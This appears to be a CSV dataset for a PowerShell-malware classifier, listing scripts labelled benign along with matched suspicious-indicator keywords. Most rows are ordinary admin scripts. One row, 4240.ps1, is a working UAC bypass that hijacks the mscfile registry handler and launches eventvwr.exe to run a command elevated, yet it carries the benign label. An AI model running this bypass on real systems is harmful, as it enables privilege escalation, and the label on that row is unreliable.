filename,label,source,primary_indicator,matched_indicators,indicator_count,has_indicator,raw_char_len,used_char_len,was_truncated,content
2969.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-Expression|Invoke-WebRequest,2,True,2339,2339,False,"function script:Start-NativeExecution([scriptblock]$sb, [switch]$IgnoreExitcode) {
    $backupEAP = $script:ErrorActionPreference
    $script:ErrorActionPreference = ""Continue""
    try {
        & $sb
        
        
        if ($LASTEXITCODE -ne 0 -and -not $IgnoreExitcode) {
            throw ""Execution of {$sb} failed with exit code $LASTEXITCODE""
        }
    }
    finally {
        $script:ErrorActionPreference = $backupEAP
    }
}

function Install-Dotnet {
    [CmdletBinding()]
    param(
        [string]$Channel = $dotnetCLIChannel,
        [string]$Version = $dotnetCLIRequiredVersion,
        [switch]$NoSudo
    )

    
    
    $sudo = if (!$NoSudo) { ""sudo"" }

    $obtainUrl = ""https://raw.githubusercontent.com/dotnet/cli/master/scripts/obtain""

    
    if ($IsLinux -or $IsMacOS) {
        
        $uninstallScript = if ($IsUbuntu) {
            ""dotnet-uninstall-debian-packages.sh""
        }
        elseif ($IsMacOS) {
            ""dotnet-uninstall-pkgs.sh""
        }

        if ($uninstallScript) {
            Start-NativeExecution {
                curl -sO $obtainUrl/uninstall/$uninstallScript
                Invoke-Expression ""$sudo bash ./$uninstallScript""
            }
        }
        else {
            Write-Warning ""This script only removes prior versions of dotnet for Ubuntu 14.04 and OS X""
        }

        
        $installScript = ""dotnet-install.sh""
        Start-NativeExecution {
            curl -sO $obtainUrl/$installScript
            bash ./$installScript -c $Channel -v $Version
        }
    }
    elseif (!(Test-Path Variable:\IsWindows) -or $IsWindows) {
        Remove-Item -ErrorAction SilentlyContinue -Recurse -Force ~\AppData\Local\Microsoft\dotnet
        $installScript = ""dotnet-install.ps1""
        Invoke-WebRequest -Uri $obtainUrl/$installScript -OutFile $installScript

        if (-not $IsCoreCLR) {
            & ./$installScript -Channel $Channel -Version $Version
        }
        else {
            
            $fullPSPath = Join-Path -Path $env:windir -ChildPath ""System32\WindowsPowerShell\v1.0\powershell.exe""
            $fullDotnetInstallPath = Join-Path -Path $pwd.Path -ChildPath $installScript
            Start-NativeExecution { & $fullPSPath -NoLogo -NoProfile -File $fullDotnetInstallPath -Channel $Channel -Version $Version }
        }
    }
}"
712.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,4,True,2440,2440,False,"function Get-RsRestItemDataSource
{
    

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [Alias('ItemPath','Path')]
        [string]
        $RsItem,

        [string]
        $ReportPortalUri,

        [Alias('ApiVersion')]
        [ValidateSet(""v2.0"")]
        [string]
        $RestApiVersion = ""v2.0"",

        [Alias('ReportServerCredentials')]
        [System.Management.Automation.PSCredential]
        $Credential,

        [Microsoft.PowerShell.Commands.WebRequestSession]
        $WebSession
    )
    Begin
    {
        $WebSession = New-RsRestSessionHelper -BoundParameters $PSBoundParameters
        $ReportPortalUri = Get-RsPortalUriHelper -WebSession $WebSession
        $catalogItemsUri = $ReportPortalUri + ""api/$RestApiVersion/CatalogItems(Path='{0}')""
        $dataSourcesUri = $ReportPortalUri + ""api/$RestApiVersion/{0}(Path='{1}')?`$expand=DataSources""
    }
    Process
    {
        try
        {
            Write-Verbose ""Fetching metadata for $RsItem...""
            $catalogItemsUri = [String]::Format($catalogItemsUri, $RsItem)
            if ($Credential -ne $null)
            {
                $response = Invoke-WebRequest -Uri $catalogItemsUri -Method Get -WebSession $WebSession -Credential $Credential -Verbose:$false
            }
            else
            {
                $response = Invoke-WebRequest -Uri $catalogItemsUri -Method Get -WebSession $WebSession -UseDefaultCredentials -Verbose:$false
            }

            $item = ConvertFrom-Json $response.Content
            $itemType = $item.Type

            Write-Verbose ""Fetching data sources for $RsItem...""
            $dataSourcesUri = [String]::Format($dataSourcesUri, $itemType + ""s"", $RsItem)

            if ($Credential -ne $null)
            {
                $response = Invoke-WebRequest -Uri $dataSourcesUri -Method Get -WebSession $WebSession -Credential $Credential -Verbose:$false
            }
            else
            {
                $response = Invoke-WebRequest -Uri $dataSourcesUri -Method Get -WebSession $WebSession -UseDefaultCredentials -Verbose:$false
            }

            $itemWithDataSources = ConvertFrom-Json $response.Content
            return $itemWithDataSources.DataSources
        }
        catch
        {
            throw (New-Object System.Exception(""Failed to get data sources for '$RsItem': $($_.Exception.Message)"", $_.Exception))
        }
    }
}"
2165.ps1,benign,natural_overlap,Invoke-WebRequest,DownloadFile|Invoke-WebRequest|Net.WebClient,4,True,2449,2449,False,"﻿
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, ParameterSetName=""AppName"", HelpMessage=""Specify the app name to search for within the App Store."")]
    [ValidateNotNullOrEmpty()]
    [ValidatePattern(""^[A-Za-z\s]*$"")]
    [string]$AppName,

    [parameter(Mandatory=$true, ParameterSetName=""Url"", HelpMessage=""Specify the URL pointing to the app in the App Store."")]
    [ValidateNotNullOrEmpty()]
    [string]$URL,

    [parameter(Mandatory=$true, ParameterSetName=""AppName"", HelpMessage=""Path to a folder where the app image will be downloaded to."")]
    [parameter(Mandatory=$true, ParameterSetName=""Url"")]
    [ValidateNotNullOrEmpty()]
    [ValidatePattern(""^[A-Za-z]{1}:\\\w+"")]
    [ValidateScript({
	    
	    if ((Split-Path -Path $_ -Leaf).IndexOfAny([IO.Path]::GetInvalidFileNameChars()) -ge 0) {
		    Throw ""$(Split-Path -Path $_ -Leaf) contains invalid characters""
	    }
	    else {
		    
		    if (Test-Path -Path $_ -PathType Container) {
				    return $true
		    }
		    else {
			    Throw ""Unable to locate part of or the whole specified path, specify a valid path""
		    }
	    }
    })]
    [string]$Path
)
Process {
    
    $StoreAppName = ($AppName -replace "" "", ""+"").ToLower()

    switch ($PSCmdlet.ParameterSetName) {
        ""AppName"" {
            
            $SearchURL = ""https://itunes.apple.com/search?term=$($StoreAppName)&entity=software&limit=1""
            $SearchWebRequest = Invoke-WebRequest -Uri $SearchURL
            $AppLink = (ConvertFrom-Json -InputObject $SearchWebRequest).Results | Select-Object -ExpandProperty trackViewUrl
        }
        ""Url"" {
            $AppLink = $URL
        }
    }

    
    if ($AppLink -ne $null) {
        $WebRequest = Invoke-WebRequest -Uri $AppLink
        $AppIcon = $WebRequest.Images | Where-Object { ($_.Width -eq 175) -and ($_.Class -like ""artwork"") }
        if ($AppIcon -ne $null) {
            
            $WebClient = New-Object System.Net.WebClient
            $WebClient.DownloadFile($AppIcon.""src-swap"", ""$($Path)\$($AppIcon.alt).jpg"")
            $AppImage = [PSCustomObject]@{
                ImageName = $AppIcon.alt
                ImagePath = ""$($Path)\$($AppIcon.alt).jpg""
            }
            Write-Output -InputObject $AppImage
        }
    }
    else {
        Write-Warning -Message ""Unable to determine app link for specified app: $($AppName)""
    }
}
End {
    
    $WebClient.Dispose()
}"
3152.ps1,benign,natural_overlap,Net.WebClient,Net.WebClient,1,True,696,696,False,"Install-Module Coveralls -MinimumVersion 1.0.25 -Scope CurrentUser -Force -ErrorAction Stop
Import-Module Coveralls -Force -ErrorAction Stop
$coverageSet = @('Helpers\PoshGit.ps1','Helpers\Prompt.ps1')
$res = Invoke-Pester -CodeCoverage $coverageSet -OutputFormat NUnitXml -OutputFile TestsResults.xml -PassThru -EnableExit
(New-Object 'System.Net.WebClient').UploadFile(""https://ci.appveyor.com/api/testresults/nunit/$($env:APPVEYOR_JOB_ID)"", (Resolve-Path .\TestsResults.xml))
if (!$ENV:CA_KEY) {
    $ENV:CA_KEY = ""14mb4l0n1""
}
$coverageResult = Format-Coverage -PesterResults $res -CoverallsApiToken $ENV:CA_KEY -BranchName $ENV:APPVEYOR_REPO_BRANCH
Publish-Coverage -Coverage $coverageResult"
3125.ps1,benign,natural_overlap,Start-Process,Start-Process,1,True,696,696,False,"function Clear-ARPCache
{
    [CmdletBinding()]
    param(

    )

    Begin{
        if(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]""Administrator""))
        {
            Write-Warning -Message ""Administrator rights are required to clear the ARP cache! Attempts to start the process with elevated privileges...""      
        }
    }

    Process{
        try{
            Start-Process -FilePath ""$env:SystemRoot\System32\netsh.exe"" -ArgumentList ""interface ip delete arpcache"" -Verb ""RunAs"" -WindowStyle Hidden -Wait
        }
        catch{
            throw
        }
    }

    End{

    }
}"
4156.ps1,benign,natural_overlap,Start-Process,Start-Process,1,True,947,947,False,"function Uninstall-InnoSetup {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()][string]$AppName
	)
	
	$QuietUninstallString = ((Get-ChildItem -Path ""REGISTRY::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\"",""REGISTRY::HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\"" | ForEach-Object { Get-ItemProperty REGISTRY::$_ } | Where-Object { $_.DisplayName -eq $AppName }).QuietUninstallString).split(""/"")
	$Switches = ""/"" + $QuietUninstallString[1].Trim()
	Write-Host ""Uninstall""$AppName""....."" -NoNewline
	$ErrCode = (Start-Process -FilePath $QuietUninstallString[0].Trim() -ArgumentList $Switches -Wait -Passthru).ExitCode
	If (($ErrCode -eq 0) -or ($ErrCode -eq 3010)) {
		Write-Host ""Success"" -ForegroundColor Yellow
	} elseif ($ErrCode -eq 1605) {
		Write-Host ""Not Present"" -ForegroundColor Green
	} else {
		Write-Host ""Failed with Error Code:""$ErrCode
		Exit $ErrCode
	}
}"
4079.ps1,benign,natural_overlap,Start-Process,Start-Process,1,True,950,950,False,"﻿Clear-Host
Add-Type -AssemblyName System.Windows.Forms


$PowershellConsole = (Get-Host).UI.RawUI
$PowershellConsole.WindowTitle = ""Secure Screen Stopper""



$button = $null
$Global:MainProcess
$Global:RelativePath
$Global:MMProcess

Function GetRelativePath{
	$Global:RelativePath=(split-path $SCRIPT:MyInvocation.MyCommand.Path -parent)+""\""
	Write-Host $Global:RelativePath
}

Function KillProcesses{
	$Running = Get-Process -Name conhost -ErrorAction SilentlyContinue
	If($Running -ne $null){
		Stop-Process -Name conhost -Force
	}
	$Running = Get-Process -Name powershell -ErrorAction SilentlyContinue
	If($Running -ne $null){
		Stop-Process -Name powershell -Force
	}
}

GetRelativePath
$a = ""-WindowStyle Minimized -File""+[char]32+[char]34+$Global:RelativePath+""MouseMover.ps1""+[char]34
Write-Host $a
Start-Process powershell.exe $a
$button = [system.windows.forms.messagebox]::show(""Click OK to reinstate secure screen saver!"")

KillProcesses"
584.ps1,benign,natural_overlap,Start-Process,Start-Process,2,True,1149,1149,False,"﻿

function Connect-HTTP{



	
	
	
	param (
        [parameter(Mandatory=$true)]
        [string[]]$Name,
        
        [switch]$Secure
	)

    
    
    

    
	$Servers = Get-RemoteConnection -Name $Name

	
	$HttpPort = 80
	$HttpsPort = 443
    
    foreach($Server in $Servers){
    
    	
    	if($Server.Protocol -eq $null){
    		
    		
    		if($Secure){
            
    			$Protocol = ""https""
                
    		}else{
            
    			$Protocol = ""http""
    		}
    	}  
        
        $Server.Protocol | foreach{

            if($_.Name -eq ""https""){

                $Protocol = ""https""

                if($_.Port -ne """"){

                    $HttpsPort = $_.Port
                }
            }elseif($_.Name -eq ""http""){

                $Protocol = ""http""

                if($_.Port -ne """"){

                    $HttpPort = $_.Port
                }
            }
        }

        switch($Protocol){
            ""http"" {Start-Process -FilePath ($Protocol + ""://"" + $Server.Name + "":"" + $HttpPort)}
            ""https"" {Start-Process -FilePath ($Protocol + ""://"" + $Server.Name + "":"" + $HttpsPort)}
        }
    }
}"
4072.ps1,benign,natural_overlap,Start-Process,Start-Process,1,True,1199,1199,False,"﻿
[CmdletBinding()]
param ()
function Get-Architecture {

	
	[CmdletBinding()][OutputType([string])]
	param ()
	
	$OSArchitecture = Get-WmiObject -Class Win32_OperatingSystem | Select-Object OSArchitecture
	$OSArchitecture = $OSArchitecture.OSArchitecture
	Return $OSArchitecture
	
}

function Get-RelativePath {

	
	[CmdletBinding()][OutputType([string])]
	param ()
	
	$Path = (split-path $SCRIPT:MyInvocation.MyCommand.Path -parent) + ""\""
	Return $Path
}

function Install-MSUFile {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()][string]$FileName
	)
	
	$RelativePath = Get-RelativePath
	$Executable = $env:windir + ""\System32\wusa.exe""
	$Parameters = $RelativePath + $FileName + [char]32 + ""/quiet /norestart""
	$ErrCode = (Start-Process -FilePath $Executable -ArgumentList $Parameters -Wait -Passthru).ExitCode
	Return $ErrCode
}

$Architecture = Get-Architecture
If ($Architecture -eq ""32-Bit"") {
	$ReturnCode = Install-MSUFile -FileName Windows6.1-KB4019990-x86.msu
} else {
	$ReturnCode = Install-MSUFile -FileName Windows6.1-KB4019990-x64.msu
}



If ($ReturnCode -eq 2359301) {
	$ReturnCode = 3010
}
If ($ReturnCode -eq 2359302) {
	$ReturnCode = 0
}
$ReturnCode
Exit $ReturnCode"
4096.ps1,benign,natural_overlap,Start-Process,Start-Process,1,True,1318,1318,False,"﻿
[CmdletBinding()]
param ()

function Uninstall-MSIByName {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()][String]$ApplicationName,
		[ValidateNotNullOrEmpty()][String]$Switches
	)
	
	
	$Executable = $Env:windir + ""\system32\msiexec.exe""
	
	$Uninstall = Get-ChildItem HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall -Recurse -ErrorAction SilentlyContinue
	If (((Get-WmiObject -Class Win32_OperatingSystem | Select-Object OSArchitecture).OSArchitecture) -eq ""64-Bit"") {
		$Uninstall += Get-ChildItem HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall -Recurse -ErrorAction SilentlyContinue
	}
	
	$Key = $uninstall | foreach-object { Get-ItemProperty REGISTRY::$_ } | where-object { $_.DisplayName -like ""*$ApplicationName*"" }
	If ($Key -ne $null) {
		Write-Host ""Uninstall""$Key.DisplayName""....."" -NoNewline
		
		$Parameters = ""/x "" + $Key.PSChildName + [char]32 + $Switches
		
		$ErrCode = (Start-Process -FilePath $Executable -ArgumentList $Parameters -Wait -Passthru).ExitCode
		
		If (($ErrCode -eq 0) -or ($ErrCode -eq 3010) -or ($ErrCode -eq 1605)) {
			Write-Host ""Success"" -ForegroundColor Yellow
		} else {
			Write-Host ""Failed with error code ""$ErrCode -ForegroundColor Red
		}
	}
}

Uninstall-MSIByName -ApplicationName ""Google Chrome"" -Switches ""/qb- /norestart"""
4146.ps1,benign,natural_overlap,Start-Process,Start-Process,1,True,1333,1333,False,"﻿

[CmdletBinding()]
param ()

function Uninstall-MSIByName {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()][String]$ApplicationName,
		[ValidateNotNullOrEmpty()][String]$Switches
	)
	
	
	$Executable = $Env:windir + ""\system32\msiexec.exe""
	Do {
		
		$Uninstall = Get-ChildItem REGISTRY::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall -Recurse -ErrorAction SilentlyContinue -Force
		$Uninstall += Get-ChildItem REGISTRY::HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall -Recurse -ErrorAction SilentlyContinue
		
		$Key = $uninstall | foreach-object { Get-ItemProperty REGISTRY::$_ -ErrorAction SilentlyContinue} | where-object { $_.DisplayName -like ""*$ApplicationName*"" }
		If ($Key -ne $null) {
			Write-Host ""Uninstall""$Key[0].DisplayName""....."" -NoNewline
			
			$Parameters = ""/x "" + $Key[0].PSChildName + [char]32 + $Switches
			
			$ErrCode = (Start-Process -FilePath $Executable -ArgumentList $Parameters -Wait -Passthru).ExitCode
			
			If (($ErrCode -eq 0) -or ($ErrCode -eq 3010) -or ($ErrCode -eq 1605)) {
				Write-Host ""Success"" -ForegroundColor Yellow
			} else {
				Write-Host ""Failed with error code ""$ErrCode -ForegroundColor Red
			}
		}
	} While ($Key -ne $null)
}


Uninstall-MSIByName -ApplicationName ""Java 8"" -Switches ""/qb- /norestart"""
4083.ps1,benign,natural_overlap,Start-Process,Start-Process,1,True,1481,1481,False,"﻿
[CmdletBinding()]
param ()

function Uninstall-MSIByName {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()][String]$ApplicationName,
		[ValidateNotNullOrEmpty()][String]$Switches
	)
	
	
	$Executable = $Env:windir + ""\system32\msiexec.exe""
	Do {
		
		$Uninstall =  Get-ChildItem REGISTRY::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall -Recurse -ErrorAction SilentlyContinue -Force
		$Uninstall += Get-ChildItem REGISTRY::HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall -Recurse -ErrorAction SilentlyContinue
		
		$Key = $uninstall | foreach-object { Get-ItemProperty REGISTRY::$_ -ErrorAction SilentlyContinue} | where-object { $_.DisplayName -like ""*$ApplicationName*"" }
		If ($Key -ne $null) {
			Write-Host ""Uninstall""$Key[0].DisplayName""....."" -NoNewline
			
			$Parameters = ""/x "" + $Key[0].PSChildName + [char]32 + $Switches
			
			$ErrCode = (Start-Process -FilePath $Executable -ArgumentList $Parameters -Wait -Passthru).ExitCode
			
			If (($ErrCode -eq 0) -or ($ErrCode -eq 3010) -or ($ErrCode -eq 1605)) {
				Write-Host ""Success"" -ForegroundColor Yellow
			} else {
				Write-Host ""Failed with error code ""$ErrCode -ForegroundColor Red
			}
		}
	} While ($Key -ne $null)
}


Uninstall-MSIByName -ApplicationName ""Java 6"" -Switches ""/qb- /norestart""
Uninstall-MSIByName -ApplicationName ""Java 7"" -Switches ""/qb- /norestart""
Uninstall-MSIByName -ApplicationName ""Java 8"" -Switches ""/qb- /norestart"""
4089.ps1,benign,natural_overlap,Start-Process,Start-Process,1,True,1712,1712,False,"[CmdletBinding()]
param
(
	[switch]$Logging,
	[string]$LogLocation
)
function Get-Architecture {

	
	[CmdletBinding()][OutputType([string])]
	param ()
	
	$OSArchitecture = (Get-WmiObject -Class Win32_OperatingSystem | Select-Object OSArchitecture).OSArchitecture
	Return $OSArchitecture
	
}

function Get-DellCommandUpdateLocation {

	
	[CmdletBinding()][OutputType([string])]
	param ()
	
	$Architecture = Get-Architecture
	If ($Architecture -eq ""32-bit"") {
		$File = Get-ChildItem -Path $env:ProgramFiles -Filter ""dcu-cli.exe"" -ErrorAction SilentlyContinue -Recurse
	} else {
		$File = Get-ChildItem -Path ${env:ProgramFiles(x86)} -Filter ""dcu-cli.exe"" -ErrorAction SilentlyContinue -Recurse
	}
	Return $File.FullName
}

function Invoke-DriverUpdate {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()]$Executable
	)
	
	If ($Logging.IsPresent) {
		$Model = (Get-WmiObject -Class Win32_ComputerSystem).Model
		If ($LogLocation[$LogLocation.Length - 1] -ne ""\"") {
			$Location = $LogLocation + ""\"" + $Model
		} else {
			$Location = $LogLocation + $Model
		}
		If ((Test-Path $LogLocation) -eq $false) {
			New-Item -Path $LogLocation -ItemType Directory -Force | Out-Null
		}
		If ((Test-Path $Location) -eq $false) {
			New-Item -Path $Location -ItemType Directory -Force | Out-Null
		}
		$Location += ""\"" + $env:COMPUTERNAME
		If ((Test-Path $Location) -eq $true) {
			Remove-Item -Path $Location -Recurse -Force
		}
		$Arguments = ""/log"" + [char]32 + [char]34 + $Location + [char]34
	} else {
		$Arguments = [char]32
	}
	Start-Process -FilePath $Executable -ArgumentList $Arguments -Wait -Passthru | Out-Null
}


Clear-Host

$EXE = Get-DellCommandUpdateLocation

Invoke-DriverUpdate -Executable $EXE"
4240.ps1,benign,natural_overlap,Start-Process,Start-Process,1,True,1737,1737,False,"function Invoke-EventVwrBypass {


    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Switch]
        $Force
    )

    $mscCommandPath = ""HKCU:\Software\Classes\mscfile\shell\open\command""
    
    if ($Force -or ((Get-ItemProperty -Path $mscCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
        New-Item $mscCommandPath -Force |
            New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null
    }else{
        Write-Verbose ""Key already exists, consider using -Force""
        exit
    }

    if (Test-Path $mscCommandPath) {
        Write-Verbose ""Created registry entries to hijack the msc extension""
    }else{
        Write-Warning ""Failed to create registry key, exiting""
        exit
    }
    

    $EventvwrPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'eventvwr.exe'

    
    if ($PSCmdlet.ShouldProcess($EventvwrPath, 'Start process')) {
        $Process = Start-Process -FilePath $EventvwrPath -PassThru
        Write-Verbose ""Started eventvwr.exe""
    }

    
    Write-Verbose ""Sleeping 5 seconds to trigger payload""
    if (-not $PSBoundParameters['WhatIf']) {
        Start-Sleep -Seconds 5
    }

    $mscfilePath = ""HKCU:\Software\Classes\mscfile""

    if (Test-Path $mscfilePath) {
        
        Remove-Item $mscfilePath -Recurse -Force
        Write-Verbose ""Removed registry entries""
    }

    if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
        Stop-Process -Id $Process.Id
        Write-Verbose ""Killed running eventvwr process""
    }
}"
2490.ps1,benign,natural_overlap,Start-Process,Start-Process,2,True,2507,2507,False,"﻿
function Start-PacketTrace {

	[CmdletBinding()]
	[OutputType()]
	param
	(
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[ValidateScript({ Test-Path -Path ($_ | Split-Path -Parent) -PathType Container })]
		[ValidatePattern('.*\.etl$')]
		[string[]]$TraceFilePath,
		[Parameter()]
		[switch]$Force
	)
	begin {
		Set-StrictMode -Version Latest
		$ErrorActionPreference = [System.Management.Automation.ActionPreference]::Stop
	}
	process {
		try {
			if (Test-Path -Path $TraceFilePath -PathType Leaf) {
				if (-not ($Force.IsPresent)) {
					throw ""An existing trace file was found at [$($TraceFilePath)] and -Force was not used. Exiting..""
				} else {
					Remove-Item -Path $TraceFilePath
				}
			}
			$OutFile = ""$PSScriptRoot\temp.txt""
			$Process = Start-Process ""$($env:windir)\System32\netsh.exe"" -ArgumentList ""trace start persistent=yes capture=yes tracefile=$TraceFilePath"" -RedirectStandardOutput $OutFile -Wait -NoNewWindow -PassThru
			if ($Process.ExitCode -notin @(0, 3010)) {
				throw ""Failed to start the packet trace. Netsh exited with an exit code [$($Process.ExitCode)]""
			} else {
				Write-Verbose -Message ""Successfully started netsh packet capture. Capturing all activity to [$($TraceFilePath)]""
			}
		} catch {
			Write-Error -Message ""$($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber)""
		} finally {
			if (Test-Path -Path $OutFile -PathType Leaf) {
				Remove-Item -Path $OutFile
			}	
		}
	}
}



function Stop-PacketTrace {

	[CmdletBinding()]
	[OutputType()]
	param
	()
	begin {
		Set-StrictMode -Version Latest
		$ErrorActionPreference = [System.Management.Automation.ActionPreference]::Stop
	}
	process {
		try {
			$OutFile = ""$PSScriptRoot\temp.txt""
			$Process = Start-Process ""$($env:windir)\System32\netsh.exe"" -ArgumentList 'trace stop' -Wait -NoNewWindow -PassThru -RedirectStandardOutput $OutFile
			if ((Get-Content $OutFile) -eq 'There is no trace session currently in progress.'){
				Write-Verbose -Message 'There are no trace sessions currently in progress'
			} elseif ($Process.ExitCode -notin @(0, 3010)) {
				throw ""Failed to stop the packet trace. Netsh exited with an exit code [$($Process.ExitCode)]""
			} else {
				Write-Verbose -Message 'Successfully stopped netsh packet capture'
			}
		} catch {
			Write-Error -Message ""Error: $($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber)""
		} finally {
			if (Test-Path -Path $OutFile -PathType Leaf) {
				Remove-Item -Path $OutFile
			}
		}
	}
}"
4099.ps1,benign,natural_overlap,Start-Process,Start-Process,2,True,2609,2609,False,"function Install-EXEUpdates {
	
	Set-Variable -Name Arguments -Scope Local -Force
	Set-Variable -Name ErrCode -Scope Local -Force
	Set-Variable -Name File -Scope Local -Force
	Set-Variable -Name EXEFiles -Scope Local -Force
	Set-Variable -Name RelativePath -Scope Local -Force
	
	$RelativePath = (split-path $SCRIPT:MyInvocation.MyCommand.Path -parent) + ""\""
	$EXEFiles = Get-ChildItem -Path $RelativePath -Force | where { $_.Name -like ""*.exe*"" }
	If ($EXEFiles.Count -ge 1) {
		$EXEFiles | Sort-Object
		cls
		foreach ($File in $EXEFiles) {
			$Arguments = ""/passive /norestart""
			Write-Host ""Installing""$File.Name""....."" -NoNewline
			$ErrCode = (Start-Process -FilePath $File.Fullname -ArgumentList $Arguments -Wait -Passthru).ExitCode
			If ($ErrCode -eq 0) {
				Write-Host ""Success"" -ForegroundColor Yellow
			} else {
				Write-Host ""Failed with error code""$ErrCode -ForegroundColor Red
			}
		}
	}

	
	Remove-Variable -Name Arguments -Scope Local -Force
	Remove-Variable -Name ErrCode -Scope Local -Force
	Remove-Variable -Name File -Scope Local -Force
	Remove-Variable -Name EXEFiles -Scope Local -Force
	Remove-Variable -Name RelativePath -Scope Local -Force
}

function Install-MSUUpdates {
	
	Set-Variable -Name Arguments -Scope Local -Force
	Set-Variable -Name ErrCode -Scope Local -Force
	Set-Variable -Name Executable -Value $env:windir""\System32\wusa.exe"" -Scope Local -Force
	Set-Variable -Name File -Scope Local -Force
	Set-Variable -Name MSUFiles -Scope Local -Force
	Set-Variable -Name RelativePath -Scope Local -Force
	
	$RelativePath = (split-path $SCRIPT:MyInvocation.MyCommand.Path -parent) + ""\""
	$MSUFiles = Get-ChildItem -Path $RelativePath -Force | where { $_.Name -like ""*.msu*"" }
	If ($MSUFiles.Count -ge 1) {
		$MSUFiles | Sort-Object
		cls
		foreach ($File in $MSUFiles) {
			$Arguments = $File.FullName + [char]32 + ""/quiet /norestart""
			Write-Host ""Installing""$File.Name""....."" -NoNewline
			$ErrCode = (Start-Process -FilePath $Executable -ArgumentList $Arguments -Wait -Passthru).ExitCode
			If (($ErrCode -eq 0) -or ($ErrCode -eq 2359302)) {
				Write-Host ""Success"" -ForegroundColor Yellow
			} else {
				Write-Host ""Failed with error code""$ErrCode -ForegroundColor Red
			}
		}
	}
	
	
	Remove-Variable -Name Arguments -Scope Local -Force
	Remove-Variable -Name ErrCode -Scope Local -Force
	Remove-Variable -Name Executable -Scope Local -Force
	Remove-Variable -Name File -Scope Local -Force
	Remove-Variable -Name MSUFiles -Scope Local -Force
	Remove-Variable -Name RelativePath -Scope Local -Force
}

cls
Install-EXEUpdates
Install-MSUUpdates
Start-Sleep -Seconds 5"
